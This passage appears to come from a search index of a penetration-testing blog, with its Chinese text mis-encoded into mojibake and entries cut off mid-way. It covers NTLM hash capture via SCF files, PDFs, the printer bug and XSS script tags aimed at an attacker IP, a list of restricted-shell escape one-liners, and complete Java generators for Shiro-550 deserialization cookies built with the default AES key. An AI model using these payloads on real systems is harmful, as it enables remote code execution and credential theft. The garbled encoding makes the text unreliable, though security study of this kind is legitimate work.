è¿™æ˜¯æ–‡ä»¶èµ„æºç®¡ç†å™¨å‘½ä»¤æ–‡ä»¶ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­çš„IconFileå±æ€§å¯ä»¥æŒ‡å®šUNCè·¯å¾„ï¼Œæ–‡ä»¶èµ„æºç®¡ç†å™¨ä¼šåŠ è½½è¿™ä¸ªå±æ€§æŒ‡å®šçš„æ–‡ä»¶å›¾æ ‡ï¼Œé‚£ä¹ˆå’Œä¸Šé¢åŒç†ï¼š\nåœ¨ä»»æ„æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºtest.scfæ–‡ä»¶ï¼š\n[shell] Command=2 IconFile=\\\\192.168.111.130\\share\\test.ico [Taskbar] Command=ToggleDesktop ç”¨æˆ·è®¿é—®è¯¥æ–‡ä»¶å¤¹å°±ä¼šè‡ªåŠ¨è¯·æ±‚æœåŠ¡å™¨ï¼Œå¯¼è‡´htlm hashè¢«æˆªè·ï¼š\næ–‡æ¡£ç±»æ–‡ä»¶ PDFè§„èŒƒå…è®¸GoTobeå’ŒGoToRæ¡ç›®åŠ è½½è¿œç¨‹å†…å®¹ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åœ¨PDFä¸­æ’å…¥UNCè·¯å¾„ï¼Œå¦‚æœç”¨æˆ·ä½¿ç”¨adobe readeræ‰“å¼€pdfï¼Œåˆ™ä¼šå‘èµ·HTLMè¯·æ±‚\nå¯ä»¥ä½¿ç”¨githubä¸Šçš„badpdfè¿›è¡Œç”Ÿæˆæ¶æ„çš„PDFï¼Œè¿™é‡Œä¸åšèµ˜è¿°\nè¯¥æ–¹æ³•å±€é™æ€§å¾ˆé«˜ï¼Œå¿…é¡»ä½¿ç”¨adobe readeræ‰ä¼šè§¦å‘NTLMè®¤è¯\nå½“ç„¶officeä¹Ÿæœ‰ç±»ä¼¼çš„æ–¹æ³•ï¼Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹\næ‰“å°æœº Windowsçš„MS-RPRNåè®®ç”¨äºæ‰“å°å®¢æˆ·æœºå’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯å¯ç”¨çš„ã€‚åè®®å®šä¹‰çš„RpcRemoteFindFirstPrinterChangeNotificationEx()è°ƒç”¨åˆ›å»ºä¸€ä¸ªè¿œç¨‹æ›´æ”¹é€šçŸ¥å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç›‘è§†å¯¹æ‰“å°æœºå¯¹è±¡çš„æ›´æ”¹ï¼Œå¹¶å°†æ›´æ”¹é€šçŸ¥å‘é€åˆ°æ‰“å°å®¢æˆ·ç«¯ã€‚\nä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸæˆå‘˜éƒ½å¯ä»¥è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨çš„æ‰“å°æœåŠ¡ï¼ˆspoolsv.exeï¼‰ï¼Œå¹¶è¯·æ±‚å¯¹ä¸€ä¸ªæ–°çš„æ‰“å°ä½œä¸šè¿›è¡Œæ›´æ–°ï¼Œä»¤å…¶å°†è¯¥é€šçŸ¥å‘é€ç»™æŒ‡å®šç›®æ ‡ã€‚ä¹‹åå®ƒä¼šå°†ç«‹å³æµ‹è¯•è¯¥è¿æ¥ï¼Œå³å‘æŒ‡å®šç›®æ ‡è¿›è¡Œèº«ä»½éªŒè¯ï¼ˆæ”»å‡»è€…å¯ä»¥é€‰æ‹©é€šè¿‡Kerberosæˆ–NTLMè¿›è¡ŒéªŒè¯ï¼‰ã€‚\né€šè¿‡è„šæœ¬PetitPotemå¯ä»¥è®©ç›®æ ‡æœºå™¨å¼ºåˆ¶å›è¿\nä½†æ˜¯ç”±äºæœºå™¨ç‰ˆæœ¬é—®é¢˜ï¼Œä½¿ç”¨printerbugå¾ˆå¯èƒ½å‡ºé—®é¢˜(å‡½æ•°è°ƒç”¨é—®é¢˜)ï¼Œå¯ä»¥ä½¿ç”¨Coercerè¿›è¡Œå‡½æ•°fuzzæµ‹è¯•ï¼Œæ¯”è¾ƒå¥½ç”¨\nwebå±‚é¢çš„åˆ©ç”¨ XSS ä½¿ç”¨srcæ ‡ç­¾è¯·æ±‚æ¶æ„æœåŠ¡å™¨å‘èµ·NTLMè®¤è¯\nå¦‚æœç”¨UNCè·¯å¾„ï¼š\n\u0026lt;script src=\u0026#34;\\\\192.168.111.130\\xss\u0026#34;\u0026gt; è¿™ç§æƒ…å†µé€‚ç”¨äºIEå’Œedgeï¼Œèƒ½å¤Ÿç›´æ¥æˆªè·ntlm hash\nå¦‚æœé€šè¿‡httpï¼š\n\u0026lt;script src=\u0026#34;//192.168.30.130/xss\u0026#34;\u0026gt; è¿™æ ·çš„æ ‡ç­¾è®¿é—®é¡µé¢ä¼šå¼¹å‡ºè®¤è¯æ¡†ï¼Œéœ€è¦ç”¨æˆ·ç™»å½•åæ‰èƒ½æˆªè·htlm hash\næ–‡ä»¶åŒ…å« åŒç†äº†ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°æ”¯æŒè§£æUNCè·¯å¾„\nå½“ç„¶ï¼ŒXXEã€SSRFéƒ½å¯ä»¥å°è¯•è¿™æ ·åˆ©ç”¨\n"
    }
,
    {
        "title": "rbashé€ƒé€¸",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/rbash%E9%80%83%E9%80%B8/",
        "content": "rbashé€ƒé€¸ ä½•ä¸ºrbash rbash(The restricted mode of bash),ä¹Ÿå°±æ˜¯é™åˆ¶å‹bashï¼›æ˜¯å¹³æ—¶æ‰€è°“çš„ restricted shellçš„ä¸€ç§ï¼Œä¹Ÿæ˜¯æœ€å¸¸è§çš„ restricted shellï¼ˆrbashã€kshã€rshç­‰ï¼‰\nrhashå¯èƒ½ä¼šè®¾ç½®ä¸€äº›é™åˆ¶ï¼š\nä¸èƒ½ä½¿ç”¨cdå‘½ä»¤ï¼ˆå³ä¸èƒ½æ›´æ”¹ç›®å½•ï¼‰ ä¸èƒ½è®¾ç½®æˆ–å–æ¶ˆç¯å¢ƒå˜é‡ï¼šSHELLï¼Œ PATHï¼Œ ENVï¼Œ BASH_ENV å¯¼å…¥åŠŸèƒ½å—é™ å‘½ä»¤ä¸­æ–‡ä»¶åä¸­ä¸èƒ½åŒ…å« \u0026lsquo;/ \u0026rsquo; æˆ–\u0026rsquo;-\u0026rsquo; ä¸èƒ½ä½¿ç”¨ä½¿ç”¨ \u0026gt;ï¼Œ\u0026gt;|ï¼Œ \u0026lt;\u0026gt;ï¼Œ \u0026gt;\u0026amp;ï¼Œ \u0026amp;\u0026gt;ï¼Œ \u0026raquo; ç­‰é‡å®šå‘æ“ä½œç¬¦ ä¸èƒ½ä½¿ç”¨ unset å‘½ä»¤æ¥å–æ¶ˆç¯å¢ƒå˜é‡æˆ– shell å‡½æ•° åªèƒ½æ‰§è¡Œ PATH ç¯å¢ƒå˜é‡ä¸­æŒ‡å®šçš„å‘½ä»¤ï¼Œè€Œä¸” PATH ç¯å¢ƒå˜é‡é€šå¸¸åªåŒ…å«ä¸€äº›åŸºæœ¬çš„å‘½ä»¤ï¼Œä¾‹å¦‚ ls, cat, echo ç­‰ \u0026hellip;\u0026hellip; rbashæé«˜äº†å®‰å…¨æ€§ï¼Œä½†å¯¹æˆ‘ä»¬getshellåçš„ç›¸å…³æ“ä½œé€ æˆäº†å¾ˆå¤šé™åˆ¶ï¼ˆæ¯”å¦‚åå¼¹shellï¼‰\nå¯ç”¨rbash é¦–å…ˆåˆ›å»ºç”¨æˆ·ï¼š\nsudo adduser tw åˆ›å»ºrbashè½¯è¿æ¥:\ncd /bin ln -s bash rbash ç„¶åå¯ç”¨rbashï¼š\nsudo usermod -s /bin/rbash tw rbashé€ƒé€¸ æœ¬è´¨æ˜¯ä½¿ç”¨æŸç§æ–¹æ³•è·å–ä¸€ä¸ªæ–°çš„shellï¼Œä¸‹é¢æåˆ°çš„æ–¹æ³•éƒ½æœ‰å‰ææ¡ä»¶ï¼Œæ¯”å¦‚å‘½ä»¤/å·¥å…·/è¯­è¨€è¦å­˜åœ¨ï¼Œæˆ–æŸä¸ªç‰¹æ®Šç¬¦å·æœªå—é™åˆ¶ï¼ˆå¦‚/ï¼‰\n1.åˆ©ç”¨å¸¸è§åº”ç”¨/æ–‡ä»¶ ä½¿ç”¨Linuxç°æœ‰çš„è½¯ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤è·å–ä¸€ä¸ªshell\nviç¼–è¾‘å™¨ æ‰“å¼€viï¼Œåœ¨æœ«è¡Œæ¨¡å¼æ‰§è¡Œå‘½ä»¤ï¼š\n:set shell=/bin/bash shell å³å¯å®ç°é€ƒé€¸\nedç¼–è¾‘å™¨ ed !/bin/bash zip zip /tmp/test.zip /tmp/test -T --unzip-command=\u0026#34;sh -c /bin/bash\u0026#34; tar tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash moreã€lessã€man ç”¨è¿™ä¸‰ä¸ªå‘½ä»¤æŸ¥çœ‹ä»»æ„æ–‡ä»¶ï¼Œç„¶ååœ¨æœ«è¡Œä¸­æ‰§è¡Œï¼š\n!\u0026#39;/bin/bash\u0026#39; ftp !\u0026#39;/bin/bash\u0026#39; git git help status !/bin/bash 2.åˆ©ç”¨ç¼–ç¨‹è¯­è¨€ åˆ©ç”¨ç¼–ç¨‹è¯­è¨€å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ¥å¯åŠ¨ä¸€ä¸ªæ–°çš„shell\npython è·å–ä¸€ä¸ªæ–°çš„ç»ˆç«¯æˆ–è€…bash shellï¼š\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; æˆ–\npython -c \u0026#39;import os; os.system(\u0026#34;/bin/bash\u0026#34;);\u0026#39; perl perl -e \u0026#39;system(\u0026#34;/bin/bash\u0026#34;);\u0026#39; é™¤äº† Python å’Œ Perlï¼Œè¿˜æœ‰å…¶ä»–ç¼–ç¨‹è¯­è¨€å¯ä»¥ç”¨æ¥å°è¯•é€ƒé€¸ rbashã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ç¼–ç¨‹è¯­è¨€åŠå…¶ç›¸åº”çš„é€ƒé€¸æ–¹æ³•ï¼š\nRuby ruby -e \u0026#39;exec \u0026#34;/bin/bash\u0026#34;\u0026#39; PHP php -r \u0026#39;system(\u0026#34;/bin/bash\u0026#34;);\u0026#39; Lua lua -e \u0026#39;os.execute(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Tcl tclsh exec /bin/bash Node.js (JavaScript) node -e \u0026#39;require(\u0026#34;child_process\u0026#34;).spawn(\u0026#34;/bin/bash\u0026#34;, {stdio: \u0026#34;inherit\u0026#34;});\u0026#39; AWK awk \u0026#39;BEGIN {system(\u0026#34;/bin/bash\u0026#34;)}\u0026#39; Java java -e \u0026#39;Runtime.getRuntime().exec(\u0026#34;/bin/bash\u0026#34;);\u0026#39; expect expect -c \u0026#39;spawn /bin/bash; interact\u0026#39; 3.åˆ©ç”¨åå¼¹shell ç›¸å…³ç¬¦å·æœªè¢«ç¦ç”¨ï¼Œåˆ©ç”¨ç¼–ç¨‹è¯­è¨€è¿›è¡Œåå¼¹shellå³å¯ï¼Œä¸ä½œèµ˜è¿°\n5.åˆ©ç”¨ssh å¦‚æœ RBASH å…è®¸ä½¿ç”¨ ssh å‘½ä»¤ï¼Œé‚£ä¹ˆç”¨æˆ·å¯ä»¥åˆ©ç”¨å®ƒçš„ -t é€‰é¡¹æˆ– ProxyCommand é€‰é¡¹æ¥æ‰§è¡Œ /bin/bash æˆ– /bin/shï¼š\nssh -t localhost /bin/bash #å¯èƒ½ä¼šè®©ä½ è¾“å¯†ç å“ˆå“ˆå“ˆå“ˆ å¦å¤–ç”±äºsshç‰ˆæœ¬çš„åŸå› ï¼Œå¯èƒ½ä¼šæœ‰å‘½ä»¤ä¸Šçš„åŒºåˆ«ï¼Œè¿™é‡Œä»…ä¾›å‚è€ƒ\n7.åˆ©ç”¨bash_cmdsè‡ªå®šä¹‰shell BASH_CMDS[a]=/bin/bash;a é€ƒé€¸åçš„æ³¨æ„äº‹é¡¹ æœ‰çš„è·å¾—æ–°çš„rbashåï¼Œå¯èƒ½æœ‰äº›å‘½ä»¤æœªå¼•å…¥ç¯å¢ƒå˜é‡ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ·»åŠ ï¼š\nexport PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin/ ",
        "summary": "rbashé€ƒé€¸ ä½•ä¸ºrbash rbash(The restricted mode of bash),ä¹Ÿå°±æ˜¯é™åˆ¶å‹bashï¼›æ˜¯å¹³æ—¶æ‰€è°“çš„ restricted shellçš„ä¸€ç§ï¼Œä¹Ÿæ˜¯æœ€å¸¸è§çš„ restricted shellï¼ˆrbashã€kshã€rshç­‰ï¼‰\nrhashå¯èƒ½ä¼šè®¾ç½®ä¸€äº›é™åˆ¶ï¼š\nä¸èƒ½ä½¿ç”¨cdå‘½ä»¤ï¼ˆå³ä¸èƒ½æ›´æ”¹ç›®å½•ï¼‰ ä¸èƒ½è®¾ç½®æˆ–å–æ¶ˆç¯å¢ƒå˜é‡ï¼šSHELLï¼Œ PATHï¼Œ ENVï¼Œ BASH_ENV å¯¼å…¥åŠŸèƒ½å—é™ å‘½ä»¤ä¸­æ–‡ä»¶åä¸­ä¸èƒ½åŒ…å« \u0026lsquo;/ \u0026rsquo; æˆ–\u0026rsquo;-\u0026rsquo; ä¸èƒ½ä½¿ç”¨ä½¿ç”¨ \u0026gt;ï¼Œ\u0026gt;|ï¼Œ \u0026lt;\u0026gt;ï¼Œ \u0026gt;\u0026amp;ï¼Œ \u0026amp;\u0026gt;ï¼Œ \u0026raquo; ç­‰é‡å®šå‘æ“ä½œç¬¦ ä¸èƒ½ä½¿ç”¨ unset å‘½ä»¤æ¥å–æ¶ˆç¯å¢ƒå˜é‡æˆ– shell å‡½æ•° åªèƒ½æ‰§è¡Œ PATH ç¯å¢ƒå˜é‡ä¸­æŒ‡å®šçš„å‘½ä»¤ï¼Œè€Œä¸” PATH ç¯å¢ƒå˜é‡é€šå¸¸åªåŒ…å«ä¸€äº›åŸºæœ¬çš„å‘½ä»¤ï¼Œä¾‹å¦‚ ls, cat, echo ç­‰ \u0026hellip;\u0026hellip; rbashæé«˜äº†å®‰å…¨æ€§ï¼Œä½†å¯¹æˆ‘ä»¬getshellåçš„ç›¸å…³æ“ä½œé€ æˆäº†å¾ˆå¤šé™åˆ¶ï¼ˆæ¯”å¦‚åå¼¹shellï¼‰\nå¯ç”¨rbash é¦–å…ˆåˆ›å»ºç”¨æˆ·ï¼š\nsudo adduser tw åˆ›å»ºrbashè½¯è¿æ¥:\ncd /bin ln -s bash rbash ç„¶åå¯ç”¨rbashï¼š\nsudo usermod -s /bin/rbash tw rbashé€ƒé€¸ æœ¬è´¨æ˜¯ä½¿ç”¨æŸç§æ–¹æ³•è·å–ä¸€ä¸ªæ–°çš„shellï¼Œä¸‹é¢æåˆ°çš„æ–¹æ³•éƒ½æœ‰å‰ææ¡ä»¶ï¼Œæ¯”å¦‚å‘½ä»¤/å·¥å…·/è¯­è¨€è¦å­˜åœ¨ï¼Œæˆ–æŸä¸ªç‰¹æ®Šç¬¦å·æœªå—é™åˆ¶ï¼ˆå¦‚/ï¼‰\n1.åˆ©ç”¨å¸¸è§åº”ç”¨/æ–‡ä»¶ ä½¿ç”¨Linuxç°æœ‰çš„è½¯ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤è·å–ä¸€ä¸ªshell\nviç¼–è¾‘å™¨ æ‰“å¼€viï¼Œåœ¨æœ«è¡Œæ¨¡å¼æ‰§è¡Œå‘½ä»¤ï¼š\n:set shell=/bin/bash shell å³å¯å®ç°é€ƒé€¸\n"
    }
,
    {
        "title": "shiroååºåˆ—åŒ–æ¼æ´",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
        "content": "shiroååºåˆ—åŒ–æ¼æ´ shiroæ˜¯ä¸€ä¸ªé€šç”¨çš„é‰´æƒæ¡†æ¶ï¼Œè€Œå®ƒæœ‰ä¸€ä¸ªå¾ˆç»å…¸çš„æ¼æ´ï¼šshiroååºåˆ—åŒ–\nç®€å•è®²è®²æ¼æ´åŸç†ï¼šä¸ºäº†è®©æµè§ˆå™¨æˆ–æœåŠ¡å™¨é‡å¯åç”¨æˆ·ä¸ä¸¢å¤±ç™»å½•çŠ¶æ€ï¼ŒShiroæ”¯æŒå°†æŒä¹…åŒ–ä¿¡æ¯åºåˆ—åŒ–å¹¶åŠ å¯†åä¿å­˜åœ¨Cookieçš„rememberMeå­—æ®µä¸­ï¼Œä¸‹æ¬¡è¯»å–æ—¶è¿›è¡Œè§£å¯†å†ååºåˆ—åŒ–ã€‚\nä½†æ˜¯åœ¨Shiro 1.2.4ç‰ˆæœ¬ä¹‹å‰å†…ç½®äº†ä¸€ä¸ªé»˜è®¤ä¸”å›ºå®šçš„AESåŠ å¯†Keyï¼Œè€Œcookieçš„ç”Ÿæˆé€»è¾‘ä¹Ÿå¾ˆæ¸…æ™°ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸²+AES åŠ å¯†+base64 åŠ å¯†ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥æŒ‰ç…§è¿™ä¸ªé€»è¾‘ä¼ªé€ ä»»æ„çš„rememberMe Cookieï¼Œè¿›è€Œè§¦å‘ååºåˆ—åŒ–æ¼æ´\næ‰€ä»¥è¿™é‡Œä¸åˆ†æåŸç†äº†ï¼Œæ¥åˆ†æä¸€ä¸‹payloadçš„æ„é€ \nTemplatesImplåœ¨shiroä¸­çš„åˆ©ç”¨ å¦‚æœç»è¿‡å°è¯•çš„è¯ï¼Œä¼šå‘ç°CommonsCollections6æ˜¯æ— æ³•åœ¨shiroä¸­åˆ©ç”¨çš„ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœååºåˆ—åŒ–æµä¸­åŒ…å«éJavaè‡ªèº«çš„æ•°ç»„ï¼Œåˆ™ä¼šå‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯ï¼Œè€ŒCC6ä¸­ç”¨åˆ°äº†transformeræ•°ç»„ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±å°è¯•ç”¨TemplatesImplæ„é€ ä¸€ä¸ªæ— æ•°ç»„çš„payload\nåœ¨åˆ†æCC6å‰æœ‰ä¸€ä¸ªnewTransformerçš„æ–¹æ³•å¦‚ä¸‹ï¼š\nTransformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null) }; è¿™é‡Œä½¿ç”¨äº†æ•°ç»„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨å…¶ä»–æ–¹æ³•æ›¿ä»£æ‰\nCC6ä¸­ç”¨åˆ°çš„TiedMapEntryç±»æœ‰ä¸€ä¸ªgetValueæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨äº†mapçš„getæ–¹æ³•ï¼Œå¹¶ä¼ å…¥keyï¼š\nè€Œè¿™ä¸ªgetæ–¹æ³•å°±æ˜¯LazyMapçš„è§¦å‘ç‚¹ï¼š\næˆ‘ä»¬æ³¨æ„åˆ°ï¼Œè¿™ä¸ª LazyMap#get çš„å‚æ•°keyï¼Œä¼šè¢«ä¼ è¿›transform()ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨å®ƒæ¥æ›¿ä»£ConstantTransformer()çš„ä½œç”¨ï¼Œè¿™æ ·ä¸€æ¥æ•°ç»„ä¸­åªå‰©ä¸€ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆè‡ªç„¶å°±ä¸éœ€è¦æ•°ç»„äº†ï¼Œæ¥ä¸‹æ¥å°è¯•æ„é€ payload\næ„é€ ï¼ˆCommonsCollectionsK1ï¼‰ åœ¨CC6çš„åŸºç¡€ä¸Šä¿®æ”¹ï¼ŒåŒæ ·ä½¿ç”¨javassistæ¥ç”Ÿæˆå‘½ä»¤æ‰§è¡Œå¼¹å‡ºè®¡ç®—å™¨çš„å­—èŠ‚ç ï¼Œå¹¶ä¸”åˆ›å»ºInvokerTransformeræ—¶å…ˆä¼ å…¥çš„æ— ç”¨æ–¹æ³•getClassï¼Œç­‰åˆ°åºåˆ—åŒ–æ—¶å†åå°„ä¿®æ”¹ä¸ºnewTransformerï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š\nbyte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\u0026#34;getClass\u0026#34;, null, null); Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;Yuy0ung\u0026#34;); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, tmpl); Map evilMap = new HashMap(); evilMap.put(tme,\u0026#34;Yuy1ung\u0026#34;); outerMap.clear(); setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); è¿™é‡Œè¦æ³¨æ„çš„æ˜¯æœ€ç»ˆçš„payloadçš„åŠ å¯†å’Œç¼–ç æ“ä½œï¼Œä¸ºäº†é¿å…å‡ºé”™å¯ä»¥ç›´æ¥ä½¿ç”¨shiroåº“ä¸­çš„åŠ å¯†å’Œç¼–ç ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.crypto.Cipher; import javax.crypto.spec.IvParameterSpec; import javax.crypto.spec.SecretKeySpec; import java.io.*; import java.util.HashMap; import java.util.Map; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class CommonsCollectionsShiro { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\u0026#34;getClass\u0026#34;, null, null); Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;Yuy0ung\u0026#34;); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, tmpl); Map evilMap = new HashMap(); evilMap.put(tme,\u0026#34;Yuy1ung\u0026#34;); outerMap.clear(); setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); byte[] payload = serialize(evilMap); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); ByteSource ciphertext = aes.encrypt(payload, key); System.out.printf(\u0026#34;rememberMe=\u0026#34; + ciphertext.toString()); } public static byte[] serialize(Map map) throws Exception { ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(map); oos.close(); return barr.toByteArray(); } } è¿è¡Œåå³å¯ç”Ÿæˆæ¶æ„rememberMe å­—æ®µï¼š\nåœ¨æœ¬åœ°ç”¨tomcatå¯åŠ¨ä¸€ä¸ªshiroæœåŠ¡ï¼š\nåœ¨shiroçš„ç™»å½•å£ï¼Œç™»å½•å¹¶é€‰æ‹©remembermeï¼Œä¼šåœ¨cookieä¸Šè·å¾—ä¸€ä¸ªrememberMeå­—æ®µï¼š\nç”¨ç”Ÿæˆçš„æ¶æ„rememberMeå­—æ®µæ¥æ›¿æ¢æ‰å¹¶å‘é€è¯·æ±‚ï¼Œå³å¯æˆåŠŸè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼š\nè¡¥å…… å¦å¤–çš„å‡ ç‚¹è¡¥å……ï¼š\nShiroä¸æ˜¯é‡åˆ°Tomcatå°±ä¸€å®šä¼šæœ‰æ•°ç»„è¿™ä¸ªé—®é¢˜\nShiro-550çš„ä¿®å¤å¹¶ä¸æ„å‘³ç€ååºåˆ—åŒ–æ¼æ´çš„ä¿®å¤ï¼Œåªæ˜¯é»˜è®¤Keyè¢«ç§»é™¤äº†\nCBé“¾åœ¨Shiroä¸­çš„ä½¿ç”¨ é¢è¯•æ—¶ç»å¸¸é—®åˆ°ï¼Œshiroæœ‰keyæ— é“¾æ€ä¹ˆæ‰“ï¼Œè¿™é‡Œå°±æ˜¯è¯´CCé“¾æ‰“ä¸äº†ï¼Œåº”å¯¹ç­–ç•¥æ— éå°±æ˜¯æ‰“CBé“¾ï¼ˆshiroè‡ªå¸¦CBä¾èµ–ï¼‰æˆ–è€…JRMPï¼ˆè¿™ä¸ªåé¢å†ç ”ç©¶ï¼‰\næ¥ä¸‹æ¥å°±çœ‹çœ‹shiroçš„CBæ€ä¹ˆæ‰“\nåœ¨å‰é¢CBé“¾çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬å·²ç»å‘ç°CBæœ‰ä¸€ä¸ªComparableComparatoræ˜¯ä¾èµ–äºCCçš„ï¼Œæ‰€ä»¥ç›´æ¥æ‰“CBè‚¯å®šè¿˜æ˜¯æœ‰é—®é¢˜çš„\næˆ‘ä»¬å…ˆæŠŠshiroçš„ccä¾èµ–å»é™¤ï¼Œç„¶åæ‰“CCk1ï¼Œæœç„¶å¤±è´¥äº†ï¼Œè¯´æ‰¾ä¸åˆ°CCä¾èµ–ï¼š æˆ‘ä»¬å¯ä»¥çœ‹è§å³ä½¿pom.xmæ²¡æœ‰å¼•å…¥CBï¼Œshiroä¾ç„¶è‡ªå¸¦CBä¾èµ–ï¼š é‚£ä¹ˆè¯•è¯•CBé“¾ï¼š\npocå¦‚ä¸‹ï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.beanutils.BeanComparator; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.io.*; import java.util.Map; import java.util.PriorityQueue; import java.util.Queue; public class CommonsBeanutilsShiro { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bc = new BeanComparator(); PriorityQueue pq = new PriorityQueue(2, bc); pq.add(1); pq.add(1); setFieldValue(bc, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(pq, \u0026#34;queue\u0026#34;,new Object[]{tmpl, tmpl}); byte[] payload = serialize(pq); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); ByteSource ciphertext = aes.encrypt(payload, key); System.out.printf(\u0026#34;rememberMe=\u0026#34; + ciphertext.toString()); } public static byte[] serialize(Queue queue) throws Exception { ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); return barr.toByteArray(); } } å‘é€ç”Ÿæˆçš„rememberMeå­—æ®µåä»ç„¶æŠ¥é”™ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯æ‰¾ä¸åˆ°CCä¾èµ–é—®é¢˜ï¼š\nè¿™å’Œæˆ‘ä»¬åœ¨å­¦ä¹ 